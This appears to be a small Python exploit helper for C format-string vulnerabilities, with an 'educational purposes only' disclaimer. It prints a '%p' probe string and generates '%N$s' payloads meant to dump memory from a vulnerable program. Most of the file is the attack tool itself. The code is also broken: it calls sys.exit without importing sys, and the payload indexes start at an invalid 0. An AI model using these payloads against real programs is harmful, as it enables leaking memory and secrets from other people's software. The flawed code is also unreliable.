#!/usr/bin/env python3
# Version 1.0.0
# Date: 2025-03-11

#      _                _                           _
#     | |              | |                         (_)                                _____
#   __| |  ___    _____| |       ___  ___       __  _  _____    ___    _____ ____    /  ___\
#  / _` | / _ \  /   _/| |___   / _ \ \  \  _  /  /| | | __ \  / _ \  /  __/|  _ \  _| |_    
# | (_| || |_| | \  \  |  __ \ | |_| | |  \/ \/  | | | | |_| || |_| | \  \  | |_| |[_   _]
#  \__,_| \___/ |____/ |_,| |_| \___/   \___/\__/  |_| | ___/  \___/ |____/ | ___/   | |
#                                                      | |                  | |      |_|
#                                                      |_|                  |_|

# This is a script to exploit c dynamic format strings. This can be used to view the contents of memory addresses.
# This script is for educational purposes only. Do not use this script for malicious purposes.

def menu():
    print("1: Test the vulnerability")
    print("2: Create a payload")
    print("3: Exit")

    case = input("Enter a number: ")
    if case == "1":
        test_vuln()
    elif case == "2":
        create_payload()
    elif case == "3":
        sys.exit()
    else:
        print("Invalid input. Please enter a number.")
        menu()

def test_vuln():
    print("Run or connect to the vulnerable program and enter the following string:")
    print("%p %p %p %p %p %p %p %p %p %p")
    print("If the program crashes or prints pointer addresses, the program is vulnerable to a format string attack.")

def create_payload():
    print("How many indexes do you want to print?")
    index = input()
    for i in range(int(index)):
        print(f"%{i}$s ", end="")

menu()

